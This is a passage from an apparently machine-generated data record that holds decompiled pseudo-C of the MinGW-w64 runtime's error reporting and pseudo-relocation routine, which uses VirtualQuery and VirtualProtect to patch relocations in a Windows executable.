        "decompiled_code": "\nvoid fcn.140013a10(ulong arg1, uint8_t *arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    uint32_t *puVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint8_t **arg4_00;\n    uint8_t **ppuVar10;\n    uint *puVar11;\n    int64_t iVar12;\n    int32_t *piVar13;\n    uint uVar14;\n    char *arg1_00;\n    uint32_t uVar15;\n    uint64_t arg2_00;\n    uint32_t *puVar16;\n    int64_t iVar17;\n    int64_t iVar18;\n    uint8_t *puVar19;\n    uint8_t **arg1_01;\n    uint8_t **arg3_00;\n    uint32_t uVar20;\n    ulong in_XMM2_Qa;\n    ulong in_XMM3_Qa;\n    uint8_t *puStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong auStack408 [5];\n    uint auStack368 [2];\n    uint64_t uStack360;\n    uchar auStack352 [16];\n    ulong auStack336 [7];\n    uint8_t *apuStack280 [2];\n    uchar auStack264 [12];\n    uchar auStack252 [12];\n    uint8_t **ppuStack240;\n    int64_t iStack232;\n    int64_t iStack224;\n    uint8_t *apuStack144 [3];\n    uint8_t *puStack120;\n    int32_t iStack108;\n    ulong uStack96;\n    uint8_t **ppuStack88;\n    \n    ppuStack88 = &puStackX16;\n    puStackX16 = arg2;\n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    arg4_00 = fcn.14001def0(2);\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b);\n    ppuStack240 = fcn.14001def0(2);\n    arg3_00 = ppuStack88;\n    sub.msvcrt.dll_vfprintf();\n    sub.msvcrt.dll_abort();\n    iStack232 = *0x140136154;\n    uStack96 = arg1;\n    if (*0x140136154 < 1) goto code_r0x000140013bb0;\n    arg4_00 = NULL;\n    ppuVar10 = *0x140136158 + 0x18;\n    do {\n        arg3_00 = *ppuVar10;\n        if ((arg3_00 <= ppuStack240) && (arg3_00 = arg3_00 + *(ppuVar10[1] + 8),  ppuStack240 < arg3_00)) {\n            return;\n        }\n        uVar20 = arg4_00 + 1;\n        arg4_00 = uVar20;\n        ppuVar10 = ppuVar10 + 5;\n    } while (uVar20 != *0x140136154);\n    while (iStack224 = fcn.1400144d0(ppuStack240),  iStack224 != 0) {\n        ppuStack240 = iStack232 * 0x28;\n        puVar11 = *0x140136158 + ppuStack240;\n        *(puVar11 + 8) = iStack224;\n        *puVar11 = 0;\n        iVar12 = fcn.140014610();\n        iVar12 = iVar12 + *(iStack224 + 0xc);\n        *(*0x140136158 + 0x18 + ppuStack240) = iVar12;\n        iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar12, apuStack144, 0x30);\n        if (iVar12 == 0) {\n            arg3_00 = *(*0x140136158 + 0x18 + ppuStack240);\n            fcn.140013a10(\"  VirtualQuery failed for %d bytes at address %p\", *(iStack224 + 8), arg3_00, arg4_00);\n            break;\n        }\n        if (((iStack108 - 0x40U & 0xffffffbf) == 0) || ((iStack108 - 4U & 0xfffffffb) == 0)) {\ncode_r0x000140013b4e:\n            *0x140136154 = *0x140136154 + 1;\n            return;\n        }\n        arg3_00 = 0x40;\n        if (iStack108 == 2) {\n            arg3_00 = 0x4;\n        }\n        ppuStack240 = ppuStack240 + *0x140136158;\n        ppuStack240[1] = apuStack144[0];\n        ppuStack240[2] = puStack120;\n        arg4_00 = ppuStack240;\n        iVar9 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (iVar9 != 0) goto code_r0x000140013b4e;\n        uVar20 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.140013a10(\"  VirtualProtect failed with code 0x%x\", uVar20, arg3_00, arg4_00);\ncode_r0x000140013bb0:\n        iStack232 = 0;\n    }\n    arg1_00 = \"Address %p has no image-section\";\n    fcn.140013a10(\"Address %p has no image-section\", ppuStack240, arg3_00, arg4_00);\n    iVar9 = *0x140136150;\n    if (*0x140136150 != 0) {\n        return;\n    }\n    *0x140136150 = 1;\n    auStack336[2] = 0x140013c37;\n    fcn.140014550();\n    auStack336[2] = 0x140013c4e;\n    iVar12 = fcn.1400147b0(arg1_00);\n    iVar17 = *0x140110860;\n    puVar7 = *0x140110810;\n    *0x140136154 = 0;\n    iVar12 = -iVar12;\n    *0x140136158 = auStack264 + iVar12;\n    if (*0x140110810 - *0x140110820 < 8) {\n        *0x140136154 = 0;\n        return;\n    }\n    puVar16 = *0x140110820;\n    if (*0x140110810 - *0x140110820 < 0xc) {\ncode_r0x000140013c8d:\n        if (*puVar16 == 0) {\n            uVar20 = puVar16[1];\ncode_r0x000140013c9a:\n            if (uVar20 == 0) {\n                arg2_00 = puVar16[2];\n                if (puVar16[2] != 1) {\ncode_r0x000140013f3e:\n                    uVar14 = 0x4010f480;\n                    *(auStack336 + iVar12 + 0x10) = 0x140013f4a;\n                    fcn.140013a10(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2_00, arg3_00, arg4_00);\n                    if (*0x140136160 != NULL) {\n                        uVar5 = *(apuStack280 + iVar12 + 8);\n                        *(auStack368 + iVar12) = uVar14;\n                        *(&uStack360 + iVar12) = arg2_00;\n                        *(auStack352 + iVar12) = CONCAT88(in_XMM3_Qa, in_XMM2_Qa);\n                        *(auStack336 + iVar12) = uVar5;\n                        *(auStack408 + iVar12) = 0x140013f88;\n                        (**0x140136160)(auStack368 + iVar12);\n                    }\n                    return;\n                }\n                puVar16 = puVar16 + 3;\n                if (*0x140110810 <= puVar16) {\n                    *0x140136154 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar20 = puVar16[2];\n                        ppuVar10 = *puVar16 + iVar17;\n                        arg2_00 = uVar20;\n                        arg4_00 = *ppuVar10;\n                        arg1_01 = puVar16[1] + iVar17;\n                        if ((uVar20 & 0xff) == 0x20) goto code_r0x000140013e68;\n                        uVar15 = uVar20 & 0xff;\n                        if ((uVar20 & 0xff) < 0x21) break;\n                        if (uVar15 != 0x40) {\ncode_r0x000140013f32:\n                            *(auStack336 + iVar12 + 0x10) = 0x140013f3e;\n                            fcn.140013a10(\"  Unknown pseudo relocation bit size %d.\\n\", arg2_00, arg3_00, arg4_00);\n                            goto code_r0x000140013f3e;\n                        }\n                        puVar19 = (*arg1_01 - ppuVar10) + arg4_00;\n                        if (((uVar20 & 0xc0) == 0) && (-1 < puVar19)) goto code_r0x000140013e4f;\n                        *(auStack336 + iVar12 + 0x10) = 0x140013eb8;\n                        fcn.140013a80(arg1_01);\n                        *arg1_01 = puVar19;\ncode_r0x000140013d15:\n                        puVar16 = puVar16 + 3;\n                        if (puVar7 <= puVar16) goto code_r0x000140013db0;\n                    }\n                    if (uVar15 == 8) {\n                        uVar2 = *arg1_01;\n                        if (uVar2 < '\\0') {\n                            iVar18 = (uVar2 | 0xffffffffffffff00) - ppuVar10;\n                        }\n                        else {\n                            iVar18 = uVar2 - ppuVar10;\n                        }\n                        puVar19 = iVar18 + arg4_00;\n                        if (((uVar20 & 0xc0) == 0) && ((0xff < puVar19 || (puVar19 < -0x80)))) {\ncode_r0x000140013e4f:\n                            do {\n                                *(apuStack280 + iVar12) = puVar19;\n                                uVar20 = 0x4010f4e8;\n                                *(auStack336 + iVar12 + 0x10) = 0x140013e63;\n                                arg3_00 = arg1_01;\n                                ppuVar10 = fcn.140013a10(\"%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\\n\"\n                                                         , arg2_00, arg1_01, arg4_00);\ncode_r0x000140013e68:\n                                uVar15 = *arg1_01;\n                                if (uVar15 < 0) {\n                                    iVar18 = (uVar15 | 0xffffffff00000000) - ppuVar10;\n                                }\n                                else {\n                                    iVar18 = uVar15 - ppuVar10;\n                                }\n                                puVar19 = iVar18 + arg4_00;\n                            } while (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x80000000 || (0xffffffff < puVar19))));\n                            *(auStack336 + iVar12 + 0x10) = 0x140013ea2;\n                            fcn.140013a80(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        else {\n                            *(auStack336 + iVar12 + 0x10) = 0x140013d12;\n                            fcn.140013a80(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        goto code_r0x000140013d15;\n                    }\n                    if (uVar15 != 0x10) goto code_r0x000140013f32;\n                    uVar3 = *arg1_01;\n                    if (uVar3 < 0) {\n                        iVar18 = (uVar3 | 0xffffffffffff0000) - ppuVar10;\n                    }\n                    else {\n                        iVar18 = uVar3 - ppuVar10;\n                    }\n                    puVar19 = iVar18 + arg4_00;\n                    if (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x8000 || (0xffff < puVar19))))\n                    goto code_r0x000140013e4f;\n                    puVar16 = puVar16 + 3;\n                    *(auStack336 + iVar12 + 0x10) = 0x140013d9c;\n                    fcn.140013a80(arg1_01);\n                    *arg1_01 = puVar19;\n                } while (puVar16 < puVar7);\n                goto code_r0x000140013db0;\n            }\n        }\n    }\n    else if (**0x140110820 == 0) {\n        uVar20 = (*0x140110820)[1];\n        if ((uVar20 | (*0x140110820)[2]) == 0) {\n            puVar16 = *0x140110820 + 3;\n            goto code_r0x000140013c8d;\n        }\n        goto code_r0x000140013c9a;\n    }\n    if (*0x140110810 <= puVar16) {\n        *0x140136154 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar16 + 1;\n        uVar20 = *puVar16;\n        puVar16 = puVar16 + 2;\n        piVar13 = *puVar1 + iVar17;\n        iVar4 = *piVar13;\n        *(auStack336 + iVar12 + 0x10) = 0x140013f26;\n        fcn.140013a80(piVar13);\n        *piVar13 = uVar20 + iVar4;\n    } while (puVar16 < puVar7);\ncode_r0x000140013db0:\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x140136154) {\n        iVar17 = 0;\n        do {\n            piVar13 = *0x140136158 + iVar17;\n            iVar4 = *piVar13;\n            if (iVar4 != 0) {\n                uVar5 = *(piVar13 + 4);\n                uVar6 = *(piVar13 + 2);\n                *(auStack336 + iVar12 + 0x10) = 0x140013def;\n                (*pcVar8)(uVar6, uVar5, iVar4, auStack252);\n            }\n            iVar9 = iVar9 + 1;\n            iVar17 = iVar17 + 0x28;\n        } while (iVar9 < *0x140136154);\n    }\n    return;\n}\n",
        "token_count": 3415
    }
}